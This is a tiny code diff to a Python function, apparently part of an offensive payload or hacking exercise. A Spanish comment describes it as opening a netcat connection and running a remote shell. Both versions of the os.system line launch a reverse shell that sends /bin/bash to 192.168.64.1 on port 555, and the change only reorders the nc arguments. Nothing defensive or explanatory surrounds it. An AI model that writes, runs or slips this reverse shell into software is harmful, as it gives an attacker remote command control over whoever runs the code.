@@ -2,4 +2,4 @@ import os
 
 def run():
     # Abre una conexión utilizando netcat y ejecuta un shell remoto
-    os.system('nc -e /bin/bash 192.168.64.1 555')
+    os.system('nc -n 192.168.64.1 555 -e /bin/bash')
